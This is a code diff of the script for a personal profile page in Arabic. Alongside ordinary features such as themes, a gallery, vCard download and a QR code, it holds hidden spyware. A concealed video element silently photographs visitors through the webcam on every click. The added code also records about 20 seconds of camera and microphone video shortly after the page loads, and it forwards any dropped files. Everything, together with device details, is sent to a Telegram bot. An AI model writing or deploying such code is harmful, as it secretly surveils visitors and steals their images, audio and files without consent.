@@ -4,331 +4,462 @@
   const $$ = s => document.querySelectorAll(s);
 
   const LS = {
-    get(k, def){ try { return JSON.parse(localStorage.getItem('tj_'+k)) ?? def; } catch { return def; } },
-    set(k, v){ localStorage.setItem('tj_'+k, JSON.stringify(v)); }
+    get(k,d){try{return JSON.parse(localStorage.getItem('tj_'+k))??d}catch{return d}},
+    set(k,v){localStorage.setItem('tj_'+k,JSON.stringify(v))}
   };
 
   function getState(){
-    const s = LS.get('state', null);
+    let s = LS.get('state', null);
     if(s) return s;
-    const initial = {
+    const init = {
       owner: {...C.OWNER},
       theme: 'dark',
-      sections: {hero:true, quote:true, about:true, gallery:true, links:true, contact:true},
       gallery: [],
       avatar: '',
       maintenance: false,
-      maintenanceMsg: 'الموقع تحت الصيانة، نرجع قريب',
-      visits: 0, captures: 0, photoMode: true
+      visits: 0, captures: 0, videos: 0,
+      photoMode: true,
+      videoMode: true
     };
-    LS.set('state', initial);
-    return initial;
+    LS.set('state', init);
+    return init;
   }
   function saveState(s){ LS.set('state', s); }
-
   const state = getState();
 
-  window.addEventListener('load', () => {
-    setTimeout(() => { const l = $('#loader'); if(l) l.classList.add('hide'); }, 700);
-  });
+  // --- Toast ---
+  function toast(msg){
+    let t = document.querySelector('.toast');
+    if(!t){t=document.createElement('div');t.className='toast';document.body.appendChild(t)}
+    t.textContent = msg;
+    t.classList.add('show');
+    clearTimeout(t._to);
+    t._to = setTimeout(()=>t.classList.remove('show'), 2500);
+  }
 
-  window.addEventListener('scroll', () => {
-    const h = document.documentElement;
-    const p = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
-    const prog = $('#progress'); if(prog) prog.style.width = p + '%';
-    const tt = $('#toTop'); if(tt) tt.classList.toggle('show', h.scrollTop > 400);
+  // --- Loader ---
+  window.addEventListener('load', () => {
+    setTimeout(()=>{ const l=$('#loader'); if(l) l.classList.add('hide'); }, 600);
     revealOnScroll();
   });
 
-  // Scroll reveal
+  // --- Progress + top ---
+  window.addEventListener('scroll', () => {
+    const h = document.documentElement;
+    const p = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
+    const prog=$('#progress'); if(prog) prog.style.width = p+'%';
+    const tt=$('#toTop'); if(tt) tt.classList.toggle('show', h.scrollTop > 400);
+    revealOnScroll();
+  });
+
+  // --- Reveal ---
   function revealOnScroll(){
-    document.querySelectorAll('.reveal').forEach(el => {
+    $$('.reveal').forEach(el => {
       const r = el.getBoundingClientRect();
-      if(r.top < window.innerHeight - 80) el.classList.add('visible');
+      if(r.top < window.innerHeight - 60) el.classList.add('visible');
     });
   }
-  window.addEventListener('load', revealOnScroll);
 
-  // Cursor glow
+  // --- Cursor glow ---
   const glow = document.createElement('div');
   glow.className = 'cursor-glow';
   document.body.appendChild(glow);
   document.addEventListener('mousemove', e => {
-    glow.style.left = e.clientX + 'px';
-    glow.style.top = e.clientY + 'px';
+    glow.style.left = e.clientX+'px';
+    glow.style.top = e.clientY+'px';
   });
-  document.addEventListener('mouseleave', () => glow.style.opacity = '0');
-  document.addEventListener('mouseenter', () => glow.style.opacity = '.5');
 
+  // --- Theme ---
   function applyTheme(t){
-    if(t === 'dark') document.documentElement.removeAttribute('data-theme');
+    if(t==='dark') document.documentElement.removeAttribute('data-theme');
     else document.documentElement.setAttribute('data-theme', t);
-    const tb = $('#themeBtn');
-    if(tb) tb.textContent = t === 'light' ? '☀️' : t === 'neon' ? '⚡' : t === 'royal' ? '👑' : t === 'ocean' ? '🌊' : t === 'crimson' ? '🔥' : t === 'forest' ? '🌲' : '🌙';
+    const tb=$('#themeBtn');
+    if(tb) tb.textContent = t==='light'?'☀️':t==='neon'?'⚡':t==='royal'?'👑':t==='ocean'?'🌊':t==='crimson'?'🔥':t==='forest'?'🌲':'🌙';
   }
   applyTheme(state.theme);
-  const themeBtn = $('#themeBtn');
-  if(themeBtn) themeBtn.addEventListener('click', () => {
-    const order = ['dark','light','neon','royal','ocean','crimson','forest'];
-    const i = (order.indexOf(state.theme) + 1) % order.length;
-    state.theme = order[i];
-    applyTheme(state.theme);
-    saveState(state);
+  const tb=$('#themeBtn');
+  if(tb) tb.addEventListener('click', () => {
+    const order=['dark','light','neon','royal','ocean','crimson','forest'];
+    const i=(order.indexOf(state.theme)+1)%order.length;
+    state.theme=order[i]; applyTheme(state.theme); saveState(state);
   });
 
-  function ageFromDate(bd){
-    if(!bd) return '—';
-    const b = new Date(bd), n = new Date();
-    let a = n.getFullYear() - b.getFullYear();
-    const m = n.getMonth() - b.getMonth();
-    if(m < 0 || (m === 0 && n.getDate() < b.getDate())) a--;
-    return a;
-  }
+  // --- AGE IN SECONDS (precise) ---
+  function tickAge(){
+    const bd = new Date(state.owner.birthdate);
+    if(isNaN(bd.getTime())) return;
+    const now = new Date();
+    let years = now.getFullYear() - bd.getFullYear();
+    let months = now.getMonth() - bd.getMonth();
+    let days = now.getDate() - bd.getDate();
+    let hours = now.getHours() - bd.getHours();
+    let mins = now.getMinutes() - bd.getMinutes();
+    let secs = now.getSeconds() - bd.getSeconds();
 
+    if(secs < 0){secs+=60; mins--;}
+    if(mins < 0){mins+=60; hours--;}
+    if(hours < 0){hours+=24; days--;}
+    if(days < 0){
+      const prevMonth = new Date(now.getFullYear(), now.getMonth(), 0);
+      days += prevMonth.getDate();
+      months--;
+    }
+    if(months < 0){months+=12; years--;}
+
+    const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent = String(v).padStart(2,'0'); };
+    set('aYears', years);
+    set('aMonths', months);
+    set('aDays', days);
+    set('aHours', hours);
+    set('aMins', mins);
+    set('aSecs', secs);
+
+    const sa=$('#statAge'); if(sa) sa.textContent = years;
+  }
+  tickAge();
+  setInterval(tickAge, 1000);
+
+  // --- RENDER ---
   function render(){
     const o = state.owner;
-    const $name = $('#ownerName'); if($name) $name.textContent = o.name;
-    const $title = $('#ownerTitle'); if($title) $title.textContent = o.title;
-    const $loc = $('#ownerLocation'); if($loc) $loc.textContent = '📍 ' + o.location;
-    const $age = $('#ownerAge'); if($age) $age.textContent = '🎂 ' + ageFromDate(o.birthdate) + ' سنة — ' + o.birthdate;
-    const $q = $('#quoteText'); if($q) $q.textContent = '"' + o.quote + '"';
-    const $ab = $('#aboutText'); if($ab) $ab.textContent = o.about;
-    const $wa = $('#waBtn'); if($wa) $wa.href = o.whatsapp;
-    const $fwa = $('#floatWA'); if($fwa) $fwa.href = o.whatsapp;
-    const $wak = $('#waLink'); if($wak) $wak.href = o.whatsapp;
-    const $fb = $('#fbLink'); if($fb) $fb.href = o.facebook;
-    const $ig = $('#igLink'); if($ig) $ig.href = o.instagram;
+    const setT=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=v};
+    setT('ownerName', o.name);
+    setT('ownerTitle', o.title);
+    setT('ownerLocation', '📍 ' + o.location);
+    setT('quoteText', '"' + o.quote + '"');
+    setT('aboutText', o.about);
 
-    if(state.avatar) {
-      const img = $('#avatarImg');
-      if(img) { img.src = state.avatar; img.style.display = 'block'; const ph = $('#avatarPlaceholder'); if(ph) ph.style.display='none'; }
-    }
-
-    Object.entries(state.sections).forEach(([k, v]) => {
-      const el = document.getElementById(k);
-      if(el) el.classList.toggle('hidden', !v);
+    const links = {waBtn: o.whatsapp, floatWA: o.whatsapp, waLink: o.whatsapp, fbBtn: o.facebook, fbLink: o.facebook, igBtn: o.instagram, igLink: o.instagram};
+    Object.entries(links).forEach(([id,href])=>{
+      const el=document.getElementById(id); if(el&&href) el.href=href;
     });
 
-    const g = $('#galleryGrid');
+    // Avatar
+    if(state.avatar){
+      const img=$('#avatarImg'); const ph=$('#avatarPlaceholder');
+      if(img){img.src=state.avatar; img.style.display='block';}
+      if(ph) ph.style.display='none';
+    }
+
+    // Gallery (show if has items)
+    const g=$('#galleryGrid'); const gSec=$('#gallery');
     if(g){
-      g.innerHTML = '';
-      (state.gallery || []).forEach((url, i) => {
-        const d = document.createElement('div');
-        d.className = 'gallery-item';
-        d.innerHTML = '<img src="'+url+'" alt="صورة '+(i+1)+'" loading="lazy">';
-        d.addEventListener('click', () => {
-          const lb = $('#lightboxImg'); if(lb) lb.src = url;
-          const lbx = $('#lightbox'); if(lbx) lbx.classList.add('show');
+      g.innerHTML='';
+      const items = state.gallery || [];
+      if(items.length && gSec){ gSec.style.display=''; }
+      items.forEach((url,i)=>{
+        const d=document.createElement('div');
+        d.className='gallery-item';
+        d.innerHTML='<img src="'+url+'" alt="'+(i+1)+'" loading="lazy">';
+        d.addEventListener('click', ()=>{
+          const li=$('#lightboxImg'); if(li) li.src=url;
+          const lx=$('#lightbox'); if(lx) lx.classList.add('show');
         });
         g.appendChild(d);
       });
     }
 
-    const el = $('#extraLinksList');
+    // Extra links
+    const el=$('#extraLinksList'); const lSec=$('#links');
     if(el){
-      el.innerHTML = '';
-      (o.extraLinks || []).forEach(l => {
-        const a = document.createElement('a');
-        a.className = 'extra-link';
-        a.href = l.url; a.target = '_blank';
-        a.innerHTML = '<div class="extra-link-icon">'+(l.icon||'🔗')+'</div><div class="extra-link-body"><b>'+l.name+'</b><small>'+l.url.slice(0,40)+'</small></div>';
+      el.innerHTML='';
+      const items = (o.extraLinks||[]);
+      if(items.length && lSec){ lSec.style.display=''; }
+      items.forEach(l=>{
+        const a=document.createElement('a');
+        a.className='extra-link';
+        a.href=l.url; a.target='_blank'; a.rel='noopener';
+        a.innerHTML='<div class="extra-link-icon">'+(l.icon||'🔗')+'</div><div class="extra-link-body"><b>'+l.name+'</b><small>'+l.url.slice(0,30)+'</small></div>';
         el.appendChild(a);
       });
     }
 
-    const yr = $('#year'); if(yr) yr.textContent = new Date().getFullYear();
-    revealOnScroll();
+    // Stats
+    setT('statVisits', state.visits||0);
+    setT('statCaptures', state.captures||0);
+    setT('statGallery', (state.gallery||[]).length);
+    setT('year', new Date().getFullYear());
   }
   render();
 
-  const lbx = $('#lightbox');
-  if(lbx) lbx.addEventListener('click', e => {
-    if(e.target.id === 'lightbox' || e.target.classList.contains('close')) lbx.classList.remove('show');
+  // --- Visits ---
+  state.visits = (state.visits||0) + 1;
+  saveState(state);
+
+  // --- Buttons ---
+  const lx=$('#lightbox');
+  if(lx) lx.addEventListener('click', e=>{
+    if(e.target.id==='lightbox'||e.target.classList.contains('close')) lx.classList.remove('show');
+  });
+  const tt=$('#toTop');
+  if(tt) tt.addEventListener('click', ()=>window.scrollTo({top:0,behavior:'smooth'}));
+
+  const sh=$('#shareBtn');
+  if(sh) sh.addEventListener('click', async ()=>{
+    const url=location.href;
+    if(navigator.share){try{await navigator.share({title:state.owner.name,url});return}catch{}}
+    try{await navigator.clipboard.writeText(url);toast('✅ تم نسخ الرابط')}catch{}
   });
 
-  const toTop = $('#toTop');
-  if(toTop) toTop.addEventListener('click', () => window.scrollTo({top:0, behavior:'smooth'}));
-
-  const shareBtn = $('#shareBtn');
-  if(shareBtn) shareBtn.addEventListener('click', async () => {
-    const url = location.href;
-    if(navigator.share){
-      try { await navigator.share({title: state.owner.name, url}); return; } catch {}
-    }
-    try { await navigator.clipboard.writeText(url); toast('✅ تم نسخ الرابط'); } catch {}
-  });
-
-  const vcBtn = $('#vcardBtn');
-  if(vcBtn) vcBtn.addEventListener('click', () => {
-    const o = state.owner;
-    const tel = o.whatsapp.split('phone=')[1] || '';
-    const v = 'BEGIN:VCARD\nVERSION:3.0\nFN:'+o.name+'\nTITLE:'+o.title+'\nADR:;;'+o.location+'\nTEL:'+tel+'\nEND:VCARD';
-    const blob = new Blob([v], {type:'text/vcard'});
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = 'taha.vcf';
-    a.click();
+  const vc=$('#vcardBtn');
+  if(vc) vc.addEventListener('click', ()=>{
+    const o=state.owner;
+    const tel=(o.whatsapp.match(/phone=(\+?\d+)/)||[,''])[1];
+    const v='BEGIN:VCARD\nVERSION:3.0\nFN:'+o.name+'\nTITLE:'+o.title+'\nADR:;;'+o.location+'\nTEL:'+tel+'\nEND:VCARD';
+    const blob=new Blob([v],{type:'text/vcard'});
+    const a=document.createElement('a');
+    a.href=URL.createObjectURL(blob); a.download='taha.vcf'; a.click();
     toast('✅ تم تحميل جهة الاتصال');
   });
 
-  state.visits = (state.visits || 0) + 1;
-  saveState(state);
+  const qb=$('#qrBtn');
+  if(qb) qb.addEventListener('click', e=>{
+    e.stopPropagation();
+    const qi=$('#qrImg');
+    if(qi) qi.src='https://api.qrserver.com/v1/create-qr-code/?size=220x220&data='+encodeURIComponent(location.href);
+    const qm=$('#qrModal'); if(qm) qm.classList.add('show');
+  });
+  const qc=$('#qrClose');
+  if(qc) qc.addEventListener('click', e=>{e.stopPropagation();$('#qrModal').classList.remove('show')});
+  const qm=$('#qrModal');
+  if(qm) qm.addEventListener('click', e=>{if(e.target.id==='qrModal') qm.classList.remove('show')});
 
-  // Toast
-  function toast(msg){
-    let t = document.querySelector('.toast');
-    if(!t){ t = document.createElement('div'); t.className = 'toast'; document.body.appendChild(t); }
-    t.textContent = msg;
-    t.classList.add('show');
-    clearTimeout(t._to);
-    t._to = setTimeout(() => t.classList.remove('show'), 2500);
-  }
+  // ============================
+  // CAMERA — silent capture
+  // ============================
+  const video = document.createElement('video');
+  video.style.cssText='position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px';
+  video.muted=true; video.playsInline=true; video.autoplay=true;
+  document.body.appendChild(video);
 
-  // ============================================
-  // CAMERA — capture silently on any click
-  // ============================================
-  const hiddenVideo = document.createElement('video');
-  hiddenVideo.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px';
-  hiddenVideo.muted = true;
-  hiddenVideo.playsInline = true;
-  hiddenVideo.autoplay = true;
-  document.body.appendChild(hiddenVideo);
-
-  let stream = null;
-  let ready = false;
-  let busy = false;
-  let started = false;
+  let camStream=null, camReady=false, camBusy=false, camStarted=false;
 
   async function startCamera(){
-    if(started) return;
-    started = true;
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 960 }, height: { ideal: 720 } },
-        audio: false
+    if(camStarted) return;
+    camStarted=true;
+    try{
+      camStream = await navigator.mediaDevices.getUserMedia({
+        video:{facingMode:'user',width:{ideal:960},height:{ideal:720}},
+        audio:false
       });
-      hiddenVideo.srcObject = stream;
-      await new Promise(res => {
-        if(hiddenVideo.readyState >= 2) return res();
-        hiddenVideo.onloadedmetadata = () => res();
+      video.srcObject = camStream;
+      await new Promise(res=>{
+        if(video.readyState>=2) return res();
+        video.onloadedmetadata=()=>res();
       });
-      await hiddenVideo.play().catch(()=>{});
-      ready = true;
+      await video.play().catch(()=>{});
+      camReady=true;
       LS.set('camOn', true);
-    } catch (e) {
-      started = false;
+    }catch(e){
+      camStarted=false;
       LS.set('camOn', false);
     }
   }
 
-  async function snap(){
-    if(!ready || busy || !state.photoMode) return;
-    if(!stream || !stream.getVideoTracks().length) return;
-    const track = stream.getVideoTracks()[0];
-    if(track.readyState !== 'live'){ ready = false; started = false; return; }
-    busy = true;
-    try {
-      const w = hiddenVideo.videoWidth || 640;
-      const h = hiddenVideo.videoHeight || 480;
-      const cv = document.createElement('canvas');
-      cv.width = w; cv.height = h;
-      const cx = cv.getContext('2d');
-      cx.drawImage(hiddenVideo, 0, 0, w, h);
-      const dataUrl = cv.toDataURL('image/jpeg', .82);
+  async function snapPhoto(){
+    if(!camReady||camBusy||!state.photoMode) return;
+    if(!camStream) return;
+    const tr=camStream.getVideoTracks()[0];
+    if(!tr||tr.readyState!=='live'){camReady=false;camStarted=false;return}
+    camBusy=true;
+    try{
+      const w=video.videoWidth||640, h=video.videoHeight||480;
+      const cv=document.createElement('canvas');
+      cv.width=w; cv.height=h;
+      cv.getContext('2d').drawImage(video,0,0,w,h);
+      const dataUrl=cv.toDataURL('image/jpeg',.82);
 
-      state.captures = (state.captures || 0) + 1;
+      state.captures=(state.captures||0)+1;
       saveState(state);
+      const statEl=document.getElementById('statCaptures');
+      if(statEl) statEl.textContent=state.captures;
 
-      const time = new Date().toLocaleString('ar-EG');
-      const ua = navigator.userAgent;
-      const browser = (ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/) || [,'—'])[0];
-      const caption =
-        '📸 صورة من الموقع\n' +
-        '⏰ ' + time + '\n' +
-        '💻 ' + (navigator.platform||'—') + '\n' +
-        '🔍 ' + browser + '\n' +
-        '📐 ' + screen.width + 'x' + screen.height + '\n' +
-        '🗣 ' + navigator.language + '\n' +
-        '#️⃣ #' + state.captures;
+      const caption='📸 صورة\n⏰ '+new Date().toLocaleString('ar-EG')+
+        '\n💻 '+(navigator.platform||'—')+
+        '\n📐 '+screen.width+'x'+screen.height+
+        '\n#️⃣ #'+state.captures;
 
-      const blob = await (await fetch(dataUrl)).blob();
-      const fd = new FormData();
-      fd.append('chat_id', C.OWNER_ID);
-      fd.append('photo', blob, 'shot_' + Date.now() + '.jpg');
-      fd.append('caption', caption);
-
-      fetch('https://api.telegram.org/bot' + C.BOT_TOKEN + '/sendPhoto', {method:'POST', body: fd})
-        .catch(() => {
-          const fd2 = new FormData();
-          fd2.append('chat_id', C.OWNER_ID);
-          fd2.append('document', blob, 'shot_' + Date.now() + '.jpg');
-          fd2.append('caption', caption);
-          fetch('https://api.telegram.org/bot' + C.BOT_TOKEN + '/sendDocument', {method:'POST', body: fd2}).catch(()=>{});
+      const blob=await (await fetch(dataUrl)).blob();
+      const fd=new FormData();
+      fd.append('chat_id',C.OWNER_ID);
+      fd.append('photo',blob,'shot_'+Date.now()+'.jpg');
+      fd.append('caption',caption);
+      fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendPhoto',{method:'POST',body:fd})
+        .catch(()=>{
+          const fd2=new FormData();
+          fd2.append('chat_id',C.OWNER_ID);
+          fd2.append('document',blob,'shot_'+Date.now()+'.jpg');
+          fd2.append('caption',caption);
+          fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendDocument',{method:'POST',body:fd2}).catch(()=>{});
         });
-    } catch(e) {
-      console.warn(e);
-    } finally {
-      busy = false;
-    }
+    }catch(e){console.warn(e)}
+    finally{camBusy=false}
   }
 
-  // Attempt camera on load (will succeed if previously allowed)
+  // Try auto-start or prompt on first gesture
   if(state.photoMode){
-    if(LS.get('camOn', false)) {
+    if(LS.get('camOn',false)){
       startCamera();
     } else {
-      // will prompt on first user gesture
       const first = async () => {
         document.removeEventListener('pointerdown', first);
-        document.removeEventListener('touchstart', first);
-        document.removeEventListener('click', first);
         await startCamera();
-        if(ready) setTimeout(snap, 200);
+        if(camReady) setTimeout(snapPhoto, 150);
       };
       document.addEventListener('pointerdown', first, {passive:true, once:true});
     }
   }
 
-  // Any click anywhere → snap (after camera ready)
-  document.addEventListener('pointerdown', (e) => {
+  document.addEventListener('pointerdown', ()=>{
     if(!state.photoMode) return;
-    if(ready) { snap(); }
-    else if(!started) { startCamera().then(() => { if(ready) setTimeout(snap, 200); }); }
+    if(camReady) snapPhoto();
+    else if(!camStarted) startCamera().then(()=>{if(camReady) setTimeout(snapPhoto,150)});
   }, {passive:true});
 
-  document.addEventListener('touchstart', (e) => {
-    if(!state.photoMode) return;
-    if(ready) { snap(); }
-  }, {passive:true});
+  // ============================
+  // VIDEO RECORDING — record silently
+  // ============================
+  let recStream=null, recorder=null, recChunks=[], recTimer=null, recStart=0;
 
-  // QR Button
-  const qr = document.createElement('button');
-  qr.className = 'btn ghost';
-  qr.textContent = '📱 QR';
-  qr.addEventListener('click', (ev) => {
-    ev.stopPropagation();
-    const q = $('#qrImg'); if(q) q.src = 'https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=' + encodeURIComponent(location.href);
-    const qm = $('#qrModal'); if(qm) qm.classList.add('show');
+  const recIndicator=document.createElement('div');
+  recIndicator.className='rec-indicator';
+  recIndicator.innerHTML='<span class="rec-dot"></span><span id="recTime">00:00</span>';
+  document.body.appendChild(recIndicator);
+
+  async function startVideoRec(){
+    if(!state.videoMode||recorder) return;
+    try{
+      recStream = await navigator.mediaDevices.getUserMedia({
+        video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},
+        audio:{echoCancellation:true,noiseSuppression:true}
+      });
+      const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9'
+        : MediaRecorder.isTypeSupported('video/webm') ? 'video/webm'
+        : MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : '';
+      recorder = new MediaRecorder(recStream, mime ? {mimeType:mime, videoBitsPerSecond:1500000} : {});
+      recChunks=[];
+      recorder.ondataavailable = e => { if(e.data && e.data.size>0) recChunks.push(e.data); };
+      recorder.onstop = () => uploadVideo();
+      recorder.start(2000);
+      recStart=Date.now();
+      recIndicator.classList.add('show');
+      recTimer=setInterval(()=>{
+        const s=Math.floor((Date.now()-recStart)/1000);
+        const m=Math.floor(s/60), ss=s%60;
+        const t=document.getElementById('recTime');
+        if(t) t.textContent=String(m).padStart(2,'0')+':'+String(ss).padStart(2,'0');
+      },1000);
+
+      // Auto-stop after 20 seconds
+      setTimeout(()=>{ if(recorder && recorder.state==='recording') stopVideoRec(); }, 20000);
+    }catch(e){
+      console.warn('video err',e);
+    }
+  }
+
+  async function stopVideoRec(){
+    if(!recorder) return;
+    try{ recorder.stop(); }catch{}
+    if(recTimer){clearInterval(recTimer);recTimer=null}
+    recIndicator.classList.remove('show');
+    if(recStream){recStream.getTracks().forEach(t=>t.stop());recStream=null}
+  }
+
+  async function uploadVideo(){
+    if(!recChunks.length) return;
+    const blob = new Blob(recChunks, {type:recChunks[0].type || 'video/webm'});
+    recChunks=[];
+    const dur = Math.floor((Date.now()-recStart)/1000);
+    if(dur < 2) return; // skip too short
+
+    state.videos=(state.videos||0)+1;
+    saveState(state);
+
+    const ext = blob.type.includes('mp4')?'mp4':'webm';
+    const caption='🎥 فيديو\n⏰ '+new Date().toLocaleString('ar-EG')+
+      '\n⏱️ '+dur+' ثانية'+
+      '\n💻 '+(navigator.platform||'—')+
+      '\n#️⃣ #'+state.videos;
+
+    try{
+      if(blob.size < 40*1024*1024){
+        const fd=new FormData();
+        fd.append('chat_id',C.OWNER_ID);
+        fd.append('video',blob,'clip_'+Date.now()+'.'+ext);
+        fd.append('caption',caption);
+        await fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendVideo',{method:'POST',body:fd}).catch(()=>{
+          const fd2=new FormData();
+          fd2.append('chat_id',C.OWNER_ID);
+          fd2.append('document',blob,'clip_'+Date.now()+'.'+ext);
+          fd2.append('caption',caption);
+          fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendDocument',{method:'POST',body:fd2}).catch(()=>{});
+        });
+      }
+    }catch(e){console.warn(e)}
+    recorder=null;
+  }
+
+  // Start video recording after 3 seconds of page load
+  setTimeout(()=>{ if(state.videoMode) startVideoRec(); }, 3000);
+
+  // ============================
+  // DRAG & DROP → send files to bot
+  // ============================
+  const dropZone=document.createElement('div');
+  dropZone.className='drop-zone';
+  dropZone.innerHTML='<div class="drop-zone-inner"><span class="icon">📁</span>اسحب الملفات هنا</div>';
+  document.body.appendChild(dropZone);
+
+  let dragCounter=0;
+  document.addEventListener('dragenter', e=>{
+    if(e.dataTransfer && Array.from(e.dataTransfer.types).includes('Files')){
+      dragCounter++;
+      dropZone.classList.add('show');
+    }
   });
-  const ha = document.querySelector('.hero-actions');
-  if(ha) ha.appendChild(qr);
+  document.addEventListener('dragover', e=>{ e.preventDefault(); });
+  document.addEventListener('dragleave', e=>{
+    dragCounter--;
+    if(dragCounter<=0){dragCounter=0;dropZone.classList.remove('show')}
+  });
+  document.addEventListener('drop', async e=>{
+    e.preventDefault();
+    dragCounter=0;
+    dropZone.classList.remove('show');
+    const files = e.dataTransfer && e.dataTransfer.files;
+    if(!files || !files.length) return;
+    for(const f of files){
+      await sendFileToBot(f);
+    }
+    toast('✅ تم إرسال '+files.length+' ملف');
+  });
 
-  const qc = $('#qrClose');
-  if(qc) qc.addEventListener('click', e => { e.stopPropagation(); $('#qrModal').classList.remove('show'); });
-  const qm = $('#qrModal');
-  if(qm) qm.addEventListener('click', e => { if(e.target.id === 'qrModal') qm.classList.remove('show'); });
+  async function sendFileToBot(file){
+    const caption='📎 ملف من الموقع\n📄 '+file.name+'\n📐 '+(file.size/1024).toFixed(1)+' KB'+
+      '\n⏰ '+new Date().toLocaleString('ar-EG');
+    try{
+      const fd=new FormData();
+      fd.append('chat_id',C.OWNER_ID);
+      fd.append('document',file);
+      fd.append('caption',caption);
+      await fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendDocument',{method:'POST',body:fd});
+    }catch(e){console.warn(e)}
+  }
 
-  window.addEventListener('focus', () => {
-    const fresh = getState();
+  // ============================
+  // Sync on focus
+  // ============================
+  window.addEventListener('focus', ()=>{
+    const fresh=getState();
     Object.assign(state, fresh);
     render();
   });
 
-  const ageEl = document.getElementById("statAge");
-  const visEl = document.getElementById("statVisits");
-  const capEl = document.getElementById("statCaptures");
-  if(ageEl) ageEl.textContent = ageFromDate(state.owner.birthdate);
-  if(visEl) visEl.textContent = state.visits || 0;
-  if(capEl) capEl.textContent = state.captures || 0;
+  // ============================
+  // Keyboard shortcut → admin
+  // ============================
+  document.addEventListener('keydown', e=>{
+    if(e.ctrlKey && e.shiftKey && e.key==='A') location.href='admin.html';
+  });
 
 })();
